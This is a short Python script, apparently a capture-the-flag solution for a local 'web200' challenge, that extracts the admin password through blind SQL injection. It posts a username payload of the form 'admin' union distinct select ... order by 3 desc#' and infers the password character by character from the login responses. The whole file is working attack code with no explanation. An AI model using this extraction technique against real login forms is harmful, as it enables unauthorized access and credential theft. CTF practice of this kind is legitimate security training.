#!/usr/bin/python
# coding:utf-8

import requests

def makeStr(begin,end):
    str=""
    for i in range(begin,end):
        str+=chr(i)
    return str
def getPassword():
    url="http://127.0.0.1/web200/index.php"
    testStr = makeStr(48,127)
    username = "admin' union distinct select 1,2,0x{hex} order by 3 desc#"
    flag = ""
    for  _  in range(32):
        for i in testStr:
            data = {"username":username.format(hex=(flag+i).encode('hex')),"password":'1'}
            res = requests.post(url,data)
            if "admin" not in res.text:
                flag= flag+chr(ord(i)-1)
                print flag
                break
            else:
                print "[*]",i

if __name__== '__main__':
    getPassword()
